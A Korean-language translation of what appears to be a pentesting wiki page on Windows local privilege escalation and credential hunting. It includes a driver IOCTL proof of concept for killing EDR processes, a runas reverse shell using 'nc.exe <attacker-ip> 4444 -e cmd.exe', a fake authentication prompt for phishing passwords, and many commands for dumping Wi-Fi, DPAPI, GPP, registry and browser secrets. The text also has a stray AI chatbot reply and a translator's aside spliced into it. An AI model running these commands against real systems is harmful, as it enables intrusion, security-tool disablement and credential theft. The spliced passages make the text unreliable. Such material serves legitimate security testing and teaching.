최신 하이브 취약점은 결정론적 레이아웃을 조작하고, 쓰기 가능한 HKLM/HKU 하위 키를 악용하며, 메타데이터 손상을 커널 paged-pool overflow로 전환할 수 있게 해줍니다(커스텀 드라이버 불필요). 전체 체인은 다음을 확인하세요:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 디바이스 객체에서 FILE_DEVICE_SECURE_OPEN 누락 악용 (LPE + EDR kill)

일부 서명된 서드파티 드라이버는 IoCreateDeviceSecure를 통해 강력한 SDDL로 디바이스 객체를 생성하지만 DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하는 것을 잊습니다. 이 플래그가 없으면, 추가 컴포넌트가 포함된 경로로 디바이스를 열 때 secure DACL이 적용되지 않아 권한 없는 사용자가 다음과 같은 namespace 경로를 사용해 핸들을 얻을 수 있습니다:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

사용자가 디바이스를 열 수 있게 되면, 드라이버가 노출한 권한 있는 IOCTL들은 LPE와 변조에 악용될 수 있습니다. 실제 사례에서 관찰된 예시 기능:
- 임의 프로세스에 대해 전체 접근 권한 핸들을 반환 (token theft / DuplicateTokenEx/CreateProcessAsUser를 통한 SYSTEM 쉘).
- 무제한 raw 디스크 읽기/쓰기 (오프라인 변조, 부팅 시 지속성 트릭).
- Protected Process/Light (PP/PPL)을 포함한 임의의 프로세스 종료, 이를 통해 커널을 통한 user land에서 AV/EDR kill이 가능해짐.

최소 PoC 패턴 (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화책
- DACL로 제한하려는 device objects를 생성할 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한 있는 작업에 대해 호출자 컨텍스트를 검증하세요. 프로세스 종료나 핸들 반환을 허용하기 전에 PP/PPL 체크를 추가하세요.
- IOCTLs(access masks, METHOD_*, input validation)를 제한하고 직접적인 kernel 권한 대신 brokered 모델을 고려하세요.

수비자를 위한 탐지 아이디어
- 의심스러운 device 이름(예: \\ .\\amsdk*)에 대한 user-mode opens와 남용을 시사하는 특정 IOCTL 시퀀스를 모니터링하세요.
- Microsoft의 취약 드라이버 차단 목록(HVCI/WDAC/Smart App Control)을 적용하고 자체 허용/거부 목록을 유지하세요.

## PATH DLL Hijacking

If you have **PATH에 있는 폴더에 대한 쓰기 권한** you could be able to hijack a DLL loaded by a process and **권한 상승**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보는 다음을 참조하세요:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요.
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 열린 포트

외부에서 접근 가능한 **제한된 서비스**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 끄기, 끄기...)**

자세한 내용은 [ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
바이너리 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다

If you get root user you can listen on any port (`root user` 부분은 그대로 유지한 게 더 명확하면 그렇게 해도 됩니다) (the first time you use `nc.exe` to listen on a port it will ask via GUI if `nc` should be allowed by the firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash을 루트로 쉽게 시작하려면 `--default-user root`를 사용해 보세요.

폴더 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`에서 `WSL` 파일시스템을 탐색할 수 있습니다.

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 자격 증명 관리자 / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 다른 프로그램에 대한 사용자 자격 증명을 저장하며, **Windows**가 사용자를 **자동으로 로그인**시킬 수 있는 경우에 사용됩니다. 처음에는 사용자가 Facebook, Twitter, Gmail 등의 자격 증명을 저장해 브라우저에서 자동으로 로그인하게 해 주는 기능처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자를 자동으로 로그인시킬 수 있는 자격 증명을 저장합니다. 이는 곧 리소스(서버나 웹사이트)에 접근하기 위해 자격 증명이 필요한 어떤 **Windows application that needs credentials to access a resource**도 **Credential Manager**와 Windows Vault를 활용하여 제공된 자격 증명을 사용하고, 사용자가 매번 사용자 이름과 비밀번호를 입력할 필요가 없다는 뜻입니다.

애플리케이션이 Credential Manager와 상호작용하지 않으면 특정 리소스의 자격 증명을 사용할 수 없을 것입니다. 따라서 애플리케이션이 vault를 사용하려면 기본 저장 vault에서 해당 리소스의 자격 증명을 요청하기 위해 어떻게든 **communicate with the credential manager and request the credentials for that resource** 해야 합니다.

시스템에 저장된 자격 증명 목록을 보려면 `cmdkey`를 사용하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`를 `/savecred` 옵션과 함께 사용할 수 있습니다. 다음 예시는 SMB 공유를 통해 원격 바이너리를 호출하는 예입니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 credential 세트를 사용하여 `runas`를 실행하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
참고: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)과 같은 도구를 사용할 수 있다.

### DPAPI

The **Data Protection API (DPAPI)**는 데이터의 대칭 암호화를 위한 방법을 제공하며, 특히 비대칭 개인 키의 대칭 암호화에 Windows 운영 체제 내에서 주로 사용된다. 이 암호화는 사용자 또는 시스템 비밀을 활용하여 엔트로피에 크게 기여한다.

**DPAPI는 사용자 로그인 비밀에서 유도된 대칭 키를 통해 키를 암호화할 수 있게 한다**. 시스템 암호화가 관련된 경우에는 시스템의 도메인 인증 비밀을 사용한다.

암호화된 사용자 RSA 키는 DPAPI를 사용하여 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 나타낸다. **DPAPI 키는 사용자 개인 키를 보호하는 마스터 키와 동일한 파일에 함께 위치하며**, 일반적으로 64바이트의 무작위 데이터로 구성된다. (이 디렉터리에 대한 접근은 제한되어 `dir` 명령으로 CMD에서 내용을 나열할 수 없지만 PowerShell을 통해서는 나열할 수 있다는 점에 유의하라.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
적절한 인수(`/pvk` 또는 `/rpc`)를 사용해 **mimikatz module** `dpapi::masterkey`로 이를 복호화할 수 있습니다.

일반적으로 **credentials files protected by the master password**는 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
적절한 `/masterkey`와 함께 **mimikatz module** `dpapi::cred`를 사용하여 복호화할 수 있습니다.\
`sekurlsa::dpapi` 모듈을 사용하면(루트인 경우) **memory**에서 많은 **DPAPI** **masterkeys**를 추출할 수 있습니다.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 암호화된 자격 증명을 편리하게 저장하는 방법으로 **scripting** 및 자동화 작업에 자주 사용됩니다. 이 자격 증명은 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 컴퓨터의 동일한 사용자만 복호화할 수 있습니다.

해당 파일에서 PS 자격 증명을 **복호화**하려면 다음을 수행할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 와이파이
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
적절한 `/masterkey`와 함께 **Mimikatz** `dpapi::rdg` 모듈을 사용하여 **모든 .rdg 파일을 복호화**하세요.\
Mimikatz `sekurlsa::dpapi` 모듈로 메모리에서 **많은 DPAPI masterkeys를 추출**할 수 있습니다.

### Sticky Notes

사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 데이터베이스 파일이라는 사실을 모른 채 **비밀번호** 및 기타 정보를 **저장**합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 검색하여 조사할 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe에서 비밀번호를 복구하려면 관리자 권한으로 High Integrity 레벨에서 실행해야 한다는 점에 유의하세요.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 있습니다.\
이 파일이 존재한다면 일부 **credentials**이 구성되어 있고 **복구**될 수 있습니다.

이 코드는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 추출되었습니다:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요 .\
설치 프로그램은 **run with SYSTEM privileges**, 많은 것이 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH 키

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 항목이 있는지 확인하세요:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로에서 항목을 찾으면 대개 저장된 SSH key일 것입니다. 해당 키는 암호화되어 저장되어 있지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
이 기술에 대한 자세한 정보는 다음에서 확인하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되도록 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기법은 더 이상 유효하지 않은 것 같습니다. ssh 키를 생성하고 `ssh-add`로 추가한 다음 ssh로 머신에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고 procmon은 asymmetric key authentication 동안 `dpapi.dll`의 사용을 식별하지 못했습니다.

### 방치된 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
이 파일들은 **metasploit**을 사용하여 다음에서 검색할 수도 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

파일 **SiteList.xml** 를 검색하세요

### 캐시된 GPP Password

이전에는 Group Policy Preferences (GPP)를 통해 여러 대의 머신에 커스텀 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 그러나 이 방법에는 심각한 보안 취약점이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 이러한 GPP 내의 비밀번호는 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화되어 있었고, 이는 인증된 사용자라면 누구나 복호화할 수 있었습니다. 이로 인해 사용자가 권한 상승을 할 수 있는 심각한 위험이 발생했습니다.

이 위험을 완화하기 위해, 로컬에 캐시된 GPP 파일 중 비어있지 않은 "cpassword" 필드를 포함하는 파일을 스캔하는 기능이 개발되었습니다. 그런 파일을 찾으면 해당 함수는 비밀번호를 복호화하고 커스텀 PowerShell 객체를 반환합니다. 이 객체는 GPP와 파일 위치에 대한 세부 정보를 포함하여 이 보안 취약점을 식별하고 수정하는 데 도움을 줍니다.

`C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista 이전)_ 에서 다음 파일들을 검색하세요:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec을 사용하여 비밀번호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials 요청하기

사용자가 알고 있을 것 같다면 언제든지 **사용자에게 자신의 credentials 또는 다른 사용자의 credentials를 입력하도록 요청할 수 있습니다**(단, 클라이언트에게 직접 **credentials**를 **요청하는 것**은 정말 **위험**합니다):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명이 포함될 수 있는 가능한 파일 이름들**

과거에 **passwords**가 **clear-text** 또는 **Base64**로 저장되어 있었던 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the set of proposed files) here, and I will translate the relevant English text to Korean following your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 휴지통의 자격 증명

자격 증명을 찾기 위해 휴지통도 확인하세요

여러 프로그램에 저장된 **비밀번호를 복구**하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 레지스트리 내부

**자격 증명을 포함할 수 있는 기타 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
또한 브라우저의 방문 기록, 북마크 및 즐겨찾기도 확인하세요. 일부 **비밀번호는** 그곳에 저장되어 있을 수 있습니다.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is a technology built within the Windows operating system that allows **intercommunication** between software components of different languages. Each COM component is **identified via a class ID (CLSID)** and each component exposes functionality via one or more interfaces, identified via interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서의 일반적인 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일명을 가진 파일을 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf 플러그인입니다**. 이 플러그인은 **credentials를 검색하는 모든 metasploit POST module을 자동으로 실행**하도록 만들어졌습니다. 피해자 내부에서.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 는 이 페이지에 언급된 비밀번호를 포함하는 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 은 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

